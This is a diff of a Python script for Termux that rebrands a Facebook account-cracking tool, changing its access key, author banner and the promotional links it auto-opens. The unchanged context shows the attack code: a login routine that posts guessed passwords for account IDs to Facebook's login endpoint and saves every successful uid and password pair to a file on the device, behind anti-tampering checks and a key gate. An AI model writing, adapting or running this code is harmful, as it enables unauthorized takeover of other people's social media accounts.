@@ -17,11 +17,8 @@ from datetime import datetime
 
 import os, sys
 
-# WhatsApp Group Link
-channel_link = "https://chat.whatsapp.com/IT61AmjEjny5N6p2WBVzP7?mode=ems_copy_t"
-
 # Valid keys
-approved_keys = ["EMONBDZONE"]
+approved_keys = ["WHITEDAVIL"]
 
 def first_step():
     os.system("clear")
@@ -32,23 +29,23 @@ def first_step():
     print("\033[1;32m JOIN OUR WHATSAPP GROUPS ✅\033[0m\n")
 
     # 👉 WhatsApp Group Auto-Open
-    os.system("termux-open-url https://chat.whatsapp.com/IT61AmjEjny5N6p2WBVzP7?mode=ems_copy_t")
+    os.system("termux-open-url https://www.facebook.com/share/17mzTZGDrC/")
 
     # 👉 Youtube Channel Auto-Open
-    os.system("termux-open-url https://youtube.com/@sktechit0?si=KFtp37kI0IVqck0w")
+    os.system("termux-open-url https://www.facebook.com/share/17mzTZGDrC/")
 
-    print("\033[1;32m KEY APKO GROUP PIN SA MILY GI ✅ \033[0m\n")
-    print("[!] Pehle WhatsApp groups par join karo.")
+    print("\033[1;32m KEY APNI ADMIN ER INBOX E PABEN \033[0m\n")
+    print("[!] AGEA ADMIN K INBOX KORO.")
 
     # Yeh direct WhatsApp groups open karega
 
-    input("\n[↩] Jab join kar lo tab Enter dabao...")
+    input("\n[↩] KEY PAILE ENTER CHAP DAW...")
 def check_key():
     user_key = input("\n[?] Enter your key: ")
     if user_key in approved_keys:
         print("\n[✓] Key approved! Script is running...\n")
     else:
-        print("\n[×] Invalid key! Dobara Channel par jao.")
+        print("\n[×] Invalid key! THIK KEY NIA ASO")
         sys.exit()
 
 # Pehle channel open hoga
@@ -78,14 +75,14 @@ requests.urllib3.disable_warnings()
 
 # Initial setup and promotion
 os.system('clear')
-print(' \x1b[38;5;46m EMONBDZONE SERVER LOADING....')
+print(' \x1b[38;5;46m WHUTEDAVIL SERVER LOADING....')
 
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
 print('loading Modules ...\n')
 os.system('clear')
-os.system("xdg-open 'https://chat.whatsapp.com/IT61AmjEjny5N6p2WBVzP7?mode=ems_copy_t'")
+os.system("xdg-open 'https://www.facebook.com/share/17mzTZGDrC/'")
 
 # --- Anti-tampering and Security Checks ---
 # The script checks if the source code of the 'requests' library has been modified
@@ -208,14 +205,14 @@ def ____banner____():
                   (\  (\
  („• ֊ •„)   Assalamualaikum. . . 💌
  ━O━O━━━━━━━━━━━━━━━━━━━━━━━
-[Name]'s Intro! 🐇 💨 
-┊🌺 Name : EMON
-┊🌼 Age : 23
+[ADMIN]'s Intro! 🐇 💨 
+┊🌺 Name : KAKASHI HATAKE 
+┊🌼 Age : 20
 ┊🌻 Pronouns/Gender : Male
-┊🥕 Hobbies : HACKING
+┊🥕 Hobbies : HACKING AND GITHUB 
       Made By Bangladesh 
 ============================
-                TOOL BY EMONBDZONE 
+                TOOL BY WHITEDAVIL
 \033[0m""")
 
 
@@ -486,12 +483,12 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mEMON\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKAKASHI\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/EMON-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mEMON BABA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKAKASHI HATAKE\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                 open('/sdcard/EMON-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
